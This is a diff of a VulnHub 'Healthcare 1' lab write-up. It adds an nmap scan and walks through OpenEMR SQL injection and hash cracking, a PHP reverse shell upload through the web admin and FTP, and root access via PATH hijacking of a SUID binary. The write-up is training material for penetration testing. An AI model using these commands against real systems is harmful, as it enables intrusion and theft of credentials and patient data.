@@ -6,15 +6,72 @@ img_path: /Writeups/Vulnhub/Linux/Healthcare 1
 ---
 
 # Recon
+## NMAP Complete Scan
+```
+# Nmap 7.92 scan initiated Wed Feb  2 03:04:26 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Healthcare/192.168.110.8/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Healthcare/192.168.110.8/scans/xml/_full_tcp_nmap.xml 192.168.110.8
+adjust_timeouts2: packet supposedly had rtt of -531134 microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of -531134 microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of -176308 microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of -176308 microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of -760169 microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of -760169 microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of -760035 microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of -760035 microseconds.  Ignoring time.
+Nmap scan report for 192.168.110.8
+Host is up, received arp-response (0.00053s latency).
+Scanned at 2022-02-02 03:04:27 +08 for 17s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.3d
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
+| http-robots.txt: 8 disallowed entries 
+| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
+|_/all_our_e-mail_addresses /admin/ /
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Coming Soon 2
+|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
+|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
+MAC Address: 08:00:27:CA:51:55 (Oracle VirtualBox virtual NIC)
+OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
+Aggressive OS guesses: Linux 2.6.38 (99%), Linux 2.6.32 - 3.5 (98%), Linux 2.6.38 - 3.0 (96%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.32 - 3.10 (94%), Linux 2.6.37 (94%), Osmosys DMS DVR (93%), Linux 2.6.18 - 2.6.32 (93%), OpenWrt (Linux 2.4.32) (93%), Linux 2.6.22 (Fedora Core 6) (93%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.92%E=4%D=2/2%OT=21%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61F9844C%P=x86_64-pc-linux-gnu)
+SEQ(SP=C3%GCD=1%ISR=C6%TI=Z%CI=Z%II=I%TS=A)
+OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5B4ST11NW6%O6=M5B4ST11)
+WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)
+ECN(R=Y%DF=Y%TG=40%W=3908%O=M5B4NNSNW6%CC=N%Q=)
+T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=Y%DF=Y%TG=40%W=3890%S=O%A=S+%F=AS%O=M5B4ST11NW6%RD=0%Q=)
+T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=N)
+IE(R=Y%DFI=N%TG=40%CD=S)
 
+Uptime guess: 0.002 days (since Wed Feb  2 03:01:45 2022)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=197 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.53 ms 192.168.110.8
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Feb  2 03:04:44 2022 -- 1 IP address (1 host up) scanned in 18.18 seconds
+
+```
 ## TCP/21 (FTP)
-
 - Anonymous access denied
 
 ## TCP/80 (HTTP)
-
 ### Ferox
-
 ```		
 ┌──(root💀kali)-[~/vulnHub/Healthcare]
 └─# feroxbuster -u http://$ip -n -w /usr/share/wordlists/dirbuster/directory-list-2.3-compiled.txt -t 50
@@ -54,13 +111,11 @@ by Ben "epi" Risher 🤓                 ver: 2.4.1
 [####################] - 11m  1489922/1489922 0s      found:15      errors:0      
 [####################] - 11m  1489922/1489922 2120/s  http://192.168.110.8
 ```
-
 - `openemr`
 - `phpMyAdmin`
 - `robots`
 
 ### Nikto
-
 ```
 ┌──(root💀kali)-[~/vulnHub/Healthcare]
 └─# nikto -ask=no -h http://192.168.110.8:80 2>&1 | tee "/root/vulnHub/Healthcare/192.168.110.8/scans/tcp80/tcp_80_http_nikto.txt"
@@ -90,15 +145,14 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
-
 - `/cgi-bin/test.cgi`
 	- 'shellshock' vulnerability 
 	- a false positive
 
+
+
 # Initial Foothold
-
 ## TCP/80 (HTTP) - OpenEMR SQLi
-
 1. View enumerated directories
 	- `openemr`
 		![](images/Pasted%20image%2020220202142722.png)
@@ -106,7 +160,6 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 	- `phpMyAdmin`
 		![](images/Pasted%20image%2020220202142748.png)
 	- `robots`
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/scans]
 		└─# curl http://192.168.110.8/robots.txt -s | grep "Disallow: /" | cut -d "/" -f2 | tee robots_dir.txt
@@ -128,7 +181,6 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 		http://192.168.110.8/all_our_e-mail_addresses
 		http://192.168.110.8/admin
 		```
-
 	- `addon-modules`
 		- This directory can only be viewed from localhost
 	- `images`
@@ -137,20 +189,15 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 		- Not found
 2. Search exploits for `openEMR v4.1.0`
 	
-
 	| Exploit Title                     | Path                  |
-
 	| --------------------------------- | --------------------- |
-
 	| OpenEMR 4.1.0 - 'u' SQL Injection | php/webapps/49742.py  |
-
 	| Openemr-4.1.0 - SQL Injection     | php/webapps/17998.txt |
 
 3. Try `php/webapps/49742.py`
 	1. Edit `url` variable
 		![](images/Pasted%20image%2020220202144827.png)
 	2. Run exploit
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit]
 		└─# python3 49742.py 
@@ -173,9 +220,7 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 		admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
 		medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d
 		```
-
 4. Alternative exploit, SQLMap
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit]
 	└─# sqlmap -r sqli.txt -p 'u' -D openemr -T users -C username,password --dump --output-dir=$(pwd)/sqlmap
@@ -209,30 +254,22 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 
 	[*] ending @ 15:01:52 /2022-02-02/
 	```
-
 5. Crack hash
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit]
 	└─# hashcat -a 0 -m 100 hashes /usr/share/wordlists/rockyou.txt --show
 	3863efef9ee2bfbc51ecdca359c6302bed1389e8:ackbar
 	ab24aed5a7c4ad45615cd7e0da816eea39e4895d:medical
 	```
-
 6. Login w/ admin:ackbar
 
 ## TCP/80 - OpenEMR RCE
-
 1. Since we do not have TCP/22 up, it is very likely we gain initial foothold via RCE
 2. Search RCE exploits for `OpenEMR v4.1.0`
 	
-
 	| Exploit Title                             | Path                                 |
-
 	| ----------------------------------------- | ------------------------------------ |
-
 	| OpenEMR 5.0.1 - Remote Code Execution (1) | php/webapps/48515.py                 |
-
 	| OpenEMR-RCE <= 5.0.1                          | https://github.com/noraj/OpenEMR-RCE |
 
 3. All failed, probably because `openemr/portal/import_template.php` does not exist
@@ -241,23 +278,19 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 	2. Insert `php-reverse-shell.php`
 		![](images/Pasted%20image%2020220202160559.png)
 	3. Execute `php-reverse-shell.php` 
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp/192.168.110.8/Downloads]
 		└─# curl 192.168.110.8/openemr/sites/default/images/php-reverse-shell.php -s
 		```
-
 	4. Apache shell obtained
 		![](images/Pasted%20image%2020220202160954.png)
 
 # Initial Foothold 2
 
 ## TCP/21 (FTP) - Upload Reverse Shell
-
 - Instead of inserting reverse shell @ OpenEMR, we upload a reverse shell through FTP
 
 1. Able to access FTP w/ medical:medical
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp]
 	└─# ftp -nv $ip
@@ -276,17 +309,13 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 	226 Transfer complete
 	ftp> 
 	```
-
 	- We have write access
 2. Download all files from medical
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp]
 	└─# wget -m --no-passive ftp://medical:medical@$ip #Download all
 	```
-
 3. View directory structure
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp]
 	└─# tree 192.168.110.8/
@@ -323,14 +352,12 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 	└── Videos
 	16 directories, 14 files
 	```
-
 	- `OpenEMR Passwords.pdf`
 	- `Passwords.txt`
 	- We can tell this a user's home directory
 	- We can add our `id_rsa.pub` key to his `authorized_keys` to be able to SSH into it, but TCP/22 is not up.
 4. View interesting files
 	- `Passwords.txt`
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp]
 		└─# cat 192.168.110.8/Documents/Passwords.txt 
@@ -343,12 +370,10 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 		admin-admin
 		medical-medical
 		```
-
 	- `OpenEMR Passwords.pdf`
 		- Contains some default credentials, not useful
 5. Head back to FTP, found out that the entire filesystem `/` is shared in FTP
 6. Path to `/var/www/html/openemr`, insert `php-reverse-shell.php`
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit/openemr_rce]
 	└─# ftp -nv $ip 
@@ -369,34 +394,27 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 	226 Transfer complete
 	5495 bytes sent in 0.00 secs (30.2916 MB/s)
 	```
-
 7. Execute reverse shell
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Healthcare]
 	└─# curl 192.168.110.8/openemr/php-reverse-shell.php
 	```
 
+
 # Privilege Escalation
-
 ## Medical - Via Creds Found
-
 1. Earlier we found medical creds
 2. Switch to medical w/ medical:medical
 	![](images/Pasted%20image%2020220202164335.png)
 3. User Flag
-
 	```
 	sh-4.1$ cat user.txt
 	cat user.txt
 	d41d8cd98f00b204e9800998ecf8427e
 	sh-4.1$ 
 	```
-
 ## Root - Via SUID Binary (Path Hijacking)
-
 1. Check for SUID Binaries
-
 	```
 	[medical@localhost ~]$ find / -perm -4000 2>/dev/null 
 	...
@@ -415,9 +433,7 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 	/usr/bin/healthcheck <- Suspicious
 	...
 	```
-
 2. View contents of `healthcheck`
-
 	```
 	[medical@localhost ~]$ strings /usr/bin/healthcheck
 	/lib/ld-linux.so.2
@@ -433,41 +449,31 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 	[^_]
 	clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
 	```
-
 	- `ifconfig` is called w/o specifying its full path
 	- `fdisk` is called w/o specifying its full path
 	- `du` is called w/o specifying its full path
 3. Exploit 
 	1. Prepend `/tmp` to our PATH environment variable
-
 		```
 		[medical@localhost tmp]$ export PATH=/tmp:$PATH
 		
 		[medical@localhost ~]$ echo $PATH
 		/tmp:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin
 		```
-
 	2. Create binary to spawn a root shell
-
 		```
 		[medical@localhost tmp]$ printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s 	/tmp/rootbash\n' > /tmp/ifconfig; chmod 4777 /tmp/ifconfig;
 		```
-
 	3. Check if `/tmp/ifconfig` will be called first
-
 		```
 		[medical@localhost ~]$ which ifconfig
 		/tmp/ifconfig
 		```
-
 	4. Run `healthcheck`
-
 		```
 		[medical@localhost ~]$ /usr/bin/healthcheck
 		```
-
 	5. View `/tmp`
-
 		```
 		[medical@localhost ~]$ ls -la /tmp
 		total 5588
@@ -479,17 +485,12 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 		-rwsr-xr-x  1 root     root      864208 Feb  1 15:24 rootbash* <- Rootbash generated
 		-rw-r--r--  1 apache   apache   3841560 Jul 29  2020 setup_dump.sql
 		```
-
 	6. Obtain root shell
-
 		```
 		[medical@localhost ~]$ /tmp/rootbash -p
 		```
-
 		![](images/Pasted%20image%2020220202165301.png)
-
-4. Root Flag
-
+3. Root Flag
 	```
 	rootbash-4.1# cat root.txt 
 	██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
@@ -506,3 +507,4 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 
 	root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
 	```
+
